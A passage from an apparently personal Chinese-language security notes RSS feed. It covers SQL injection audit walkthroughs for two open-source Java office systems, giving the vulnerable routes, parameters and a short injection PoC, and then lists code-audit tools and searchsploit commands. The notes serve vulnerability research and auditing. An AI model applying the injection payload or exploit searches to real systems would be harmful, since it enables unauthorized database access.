分析：确定非框架-&amp;gt;搜关键字order by append-&amp;gt;getBaseForm()-&amp;gt;getOrderBy()-&amp;gt;getOrderColumn-&amp;gt;orderColumn 路由：Post: /admin/advicefeedback/list 参数：form.orderColumn 拼接：order by &amp;quot;).append(orderBy); Poc：&#39; xxx # (直接sqlmap梭哈) 案例2-SpringBoot+Mybatis-Oasys办公系统 https://gitee.com/aaluoxiang/oa_system 分析：确定Mybatis框架-&amp;gt;搜关键字${-&amp;gt;%${baseKey}%-&amp;gt;sortMyNotice-&amp;gt;sortMyNotice-&amp;gt;informListPaging-&amp;gt; 路由：Post: /informlistpaging 参数：baseKey 拼接：and n.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E5%AE%A1%E8%AE%A1/sql%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E5%AE%A1%E8%AE%A1/sql%E6%B3%A8%E5%85%A5/</guid>
      <description>SQL注入 正则搜索 (update|select|insert|delete).*?where.*=&#xA;功能跟踪 语句监控 </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B7%A5%E5%85%B7/</guid>
      <description>工具 专用型代码审计工具 bandit (Python) https://github.com/PyCQA/bandit&#xA;NodeJsScan https://github.com/ajinabraham/NodeJsScan&#xA;gosec https://github.com/securego/gosec&#xA;Kunlun-M (PHP&amp;amp;JS) https://github.com/LoRexxar/Kunlun-M&#xA;brakeman (Ruby) https://github.com/presidentbeef/brakeman&#xA;OpenSCA Xcheck (Java依赖组件) https://plugins.jetbrains.com/plugin/18246-opensca-xcheck&#xA;综合型代码审计工具 Fortify https://www.microfocus.com/en-us/products/application-security-testing/overview&#xA;Checkmarx https://www.checkmarx.com/&#xA;Veracode https://www.veracode.com/</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/nuclei/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/nuclei/</guid>
      <description></description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/searchsploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/searchsploit/</guid>
      <description>searchsploit 基本用法 Usage: searchsploit [options] term1 [term2] ... [termN] searchsploit afd windows local searchsploit -t oracle windows searchsploit -p 39446 searchsploit linux kernel 3.2 --exclude=&amp;#34;(PoC)|/dos/&amp;#34; searchsploit -s Apache Struts 2.0.0 searchsploit linux reverse password searchsploit -j 55555 | jq searchsploit --cve 2021-44228 搜索 cve searchsploit -cve 2019-0708&#xA;根据编号展示路径 searchsploit -p 29930&#xA;将目标文件复制到当前目录 searchsploit -m 29930</description>
    </item>
  </channel>
</rss>
